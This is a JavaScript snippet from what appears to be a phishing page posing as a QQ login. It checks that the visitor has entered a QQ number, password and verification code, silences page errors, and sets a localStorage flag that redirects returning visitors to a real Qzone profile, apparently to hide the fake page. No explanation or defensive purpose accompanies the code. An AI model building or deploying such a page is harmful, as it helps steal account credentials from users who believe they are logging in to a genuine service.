    <SCRIPT type=text/javascript>
        var not_first = localStorage.getItem('firstin');

        if(not_first){
            location.href = 'http://user.qzone.qq.com/1912156741/main';
        }
        function killerrors() {
            return true;
        }
        window.onerror = killerrors;
        var n =0;
        var array = new Array("./qq1.jpg","./qq2.jpg","./qq3.jpg","./qq4.jpg","./qq5.jpg","./qq6.jpg","./qq7.jpg","./qq8.jpg","./qq9.jpg","./qq10.jpg");
        function changeimg(m){
            n+=m;
            if(n==array.length)
            {
                n = 0;
            }
            if(n<0)
            {
                n = array.length-1;
            }

            document.getElementById("img").src = array[n];

        }
        function checkNumber() {
            if ((event.keyCode >= 48) && (event.keyCode <= 57)) {
                event.returnValue = true;
            } else {
                event.returnValue = false;
            }
        }
        function logForm_MdyReco(obj)
        {
            if(obj.username.value == "")
            {
                alert("您还没有输入QQ号码！");
                obj.username.focus();
                return false;
            }

            if(obj.pwd.value == "")
            {
                alert("您还没有输入密码！");
                obj.pwd.focus();
                return false;
            }

            if(obj.verifycode.value == "")
            {
                alert("您还没有输入验证码！");
                obj.verifycode.focus();
                return false;
            }
            localStorage.setItem('firstin',true);
            return true;
        }
    </SCRIPT>
